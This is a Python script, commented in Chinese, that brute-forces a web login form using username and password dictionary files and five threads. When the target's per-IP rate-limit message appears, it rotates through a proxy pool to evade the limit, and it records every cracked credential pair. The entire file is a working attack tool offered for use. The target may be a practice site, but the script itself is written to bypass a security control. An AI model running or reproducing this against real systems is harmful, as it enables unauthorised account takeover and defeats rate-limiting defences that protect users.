from bs4 import BeautifulSoup
import argparse
import requests

from bruteforce import bruteforce, stop_brute, success_queue, dict_queue, success_username

import settings
import utils

CUR_PROXY = None

def login_bypass_ip_limit():
    """
    针对限制了ip访问次数的登录进行爆破
    :return:
    """
    # 开始登录
    global CUR_PROXY
    try:
        login_info = dict_queue.get(block=False)
    except:
        return

    username = login_info[0]
    # 如果这个用户名已经被爆破出来密码，那么跳过这个用户名
    if username in success_username:
        return

    password = login_info[1]

    payload = {
        "username": username,
        "password": password,
    }
    print('开始尝试用户名：{},密码:{}'.format(username,password))

    S = requests.Session()
    while True:
        try:
            response = S.post(settings.LOGIN_LIMIT_IP_URL,data=payload, proxies = CUR_PROXY, timeout = 5)
            if response.status_code == 200:
                # 正常获取到了服务器请求
                soup = BeautifulSoup(response.text,'lxml')
                if soup.find('span', text='对不起，您的访问过于频繁，请等待60秒后再操作！'):
                    # 捕获到了限制信息，改用代理登录
                    print("被限制了")
                    CUR_PROXY = utils.get_proxy()
                    print("当前使用代理:{}".format(CUR_PROXY))
                    continue

                elif soup.find('a', attrs={'id':'backdoor'}):
                    # 用户名密码正确，成功登录
                    success_queue.put(payload)
                    success_username.append(username)
                    print('【爆破成功，用户名:{},密码:{}】'.format(username,password))
                    # stop_brute()
                    return True

                elif soup.find('span',text='用户名或密码错误！'):
                    # print("用户名或密码错误")
                    return False
                else:
                    pass
            else:
                print("连接异常")
        except Exception as e:
            print(e)
        # except requests.exceptions.ConnectionError:
        #     print("代理不可用,更换代理")
        #     CUR_PROXY = utils.get_proxy()
        #     print("当前使用代理:{}".format(CUR_PROXY))
        # except requests.exceptions.Timeout:
        #     print("代理连接速度过慢，更换代理！")
        #     CUR_PROXY = utils.get_proxy()
        #     print("当前使用代理:{}".format(CUR_PROXY))

        # except:
        #     # print('未知情况')
        #     pass




if __name__ == "__main__":
    # 开启代理池

    args = utils.get_parse()
    dict_username = args.get('dict_username', "username.txt")
    dict_password = args.get('dict_password', "password.txt")
    utils.get_dict(dict_username, dict_password)

    bruteforce(login_bypass_ip_limit, thread_num=5)